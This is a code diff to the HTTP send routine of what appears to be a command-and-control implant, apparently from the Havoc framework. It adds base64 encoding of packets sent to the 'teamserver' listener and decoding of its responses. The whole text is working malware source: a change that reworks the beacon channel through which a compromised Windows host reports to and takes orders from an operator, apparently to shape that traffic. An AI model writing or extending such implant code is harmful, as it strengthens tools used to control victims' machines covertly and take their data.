@@ -36,6 +36,9 @@ BOOL HttpSend(
     PVOID   RespBuffer     = { 0 };
     SIZE_T  RespSize       = { 0 };
     BOOL    Successful     = { 0 };
+    /* [HVC-002 2026-03-26] base64-encoded send buffer; freed at LEAVE */
+    PVOID   EncodedBuf     = NULL;
+    SIZE_T  EncodedSize    = 0;
 
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
@@ -243,8 +246,12 @@ BOOL HttpSend(
         }
     }
 
+    /* [HVC-002 2026-03-26] Base64-encode the packet body before transmission.
+     * The teamserver base64-decodes it before parsing. See TrafficImprovements.md §2. */
+    Base64Encode( (PUCHAR) Send->Buffer, Send->Length, &EncodedBuf, &EncodedSize );
+
     /* Send package to our listener */
-    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
+    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, EncodedBuf, (DWORD) EncodedSize, (DWORD) EncodedSize, 0 ) ) {
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
             if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
@@ -277,8 +284,19 @@ BOOL HttpSend(
                     MemSet( Buffer, 0, sizeof( Buffer ) );
                 } while ( Successful == TRUE );
 
-                Resp->Length = RespSize;
-                Resp->Buffer = RespBuffer;
+                /* [HVC-002 2026-03-26] Decode the base64-encoded response from the
+                 * teamserver before handing it to the packet parser. */
+                {
+                    PVOID  DecodedBuf  = NULL;
+                    SIZE_T DecodedSize = 0;
+
+                    Base64Decode( (PUCHAR) RespBuffer, RespSize, &DecodedBuf, &DecodedSize );
+                    MemSet( RespBuffer, 0, RespSize );
+                    Instance->Win32.LocalFree( RespBuffer );
+
+                    Resp->Length = (UINT32) DecodedSize;
+                    Resp->Buffer = DecodedBuf;
+                }
 
                 Successful = TRUE;
             }
@@ -292,6 +310,13 @@ BOOL HttpSend(
     }
 
 LEAVE:
+    /* [HVC-002 2026-03-26] Free the base64-encoded send buffer (non-NULL when
+     * WinHttpSendRequest was never reached due to an earlier failure). */
+    if ( EncodedBuf ) {
+        MemSet( EncodedBuf, 0, EncodedSize );
+        Instance->Win32.LocalFree( EncodedBuf );
+    }
+
     if ( Connect ) {
         Instance->Win32.WinHttpCloseHandle( Connect );
     }
